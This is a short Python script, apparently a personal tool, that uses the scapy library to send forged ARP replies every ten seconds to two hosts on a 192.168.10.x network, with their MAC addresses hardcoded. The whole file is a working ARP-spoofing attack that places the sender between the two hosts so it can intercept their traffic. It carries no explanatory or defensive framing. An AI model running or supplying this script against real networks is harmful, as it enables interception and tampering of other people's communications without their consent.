#!/usr/bin/env python
import scapy.all as scapy
import time
import sys

target_mac1 = "D0:1B:49:A8:3F:44"
target_mac2 = "60:60:1F:57:31:B1"

#d4:54:8b:f2:9f:ef
def spoof(target_ip, spoof_ip,mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst= mac, psrc=spoof_ip)
    scapy.send(packet)

while True:
    spoof("192.168.10.2", "192.168.10.1", target_mac2)
    spoof("192.168.10.1", "192.168.10.2", target_mac1)
    time.sleep(10)


